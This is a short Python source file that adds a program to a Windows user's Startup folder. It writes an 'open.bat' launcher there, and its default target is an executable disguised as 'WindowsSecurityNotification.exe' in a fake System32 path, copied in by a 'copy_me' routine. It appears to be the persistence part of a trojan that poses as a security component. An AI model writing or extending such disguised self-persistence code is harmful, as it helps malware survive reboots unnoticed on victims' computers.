import getpass
import os

USER_NAME = getpass.getuser()


def add_to_startup(file_path=r"C:\System32\x25x02x42\WindowsSecurityNotification.exe"):
    """
    add exe file to startup
    exe will be taken from the created copy of the "copy_me" function
    """
    try:
        if file_path == "":
            file_path = os.path.dirname(os.path.realpath(__file__))
        # creating bat file
        bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
        with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
            bat_file.write(r'start "" %s' % file_path)
    except Exception as ex:
        print(ex)
